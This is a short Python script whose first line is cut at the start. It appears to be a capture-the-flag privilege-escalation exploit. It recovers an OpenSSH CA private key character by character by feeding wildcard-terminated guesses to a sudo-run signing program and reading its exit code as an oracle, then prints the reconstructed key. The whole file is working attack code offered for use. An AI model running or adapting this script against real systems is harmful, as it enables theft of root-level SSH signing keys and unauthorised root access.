mport subprocess

startssh = "-----BEGIN OPENSSH PRIVATE KEY-----"
endssh = "-----END OPENSSH PRIVATE KEY-----"
base64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
Pas = []
line= 0

while True:
    for char in base64chars:
        JudgeKey = f"{startssh}\n{''.join(Pas)}{char}*"
        with open("crackca", "w") as f:
            f.write(JudgeKey)
        proc = subprocess.run(
            ["sudo", "<location of file>", "ca", "root.pub", "root", "root_user", "9"],
            capture_output=True
        )
        if proc.returncode == 1:
            Pas.append(char)
            if (len(Pas) - line) % 70 == 0 and len(Pas) > 0:
                Pas.append("\n")
                line = line + 1
            break
    else:
        break

Rca = f"{startssh}\n{''.join(Pas)}\n{endssh}\n"

print(Rca)
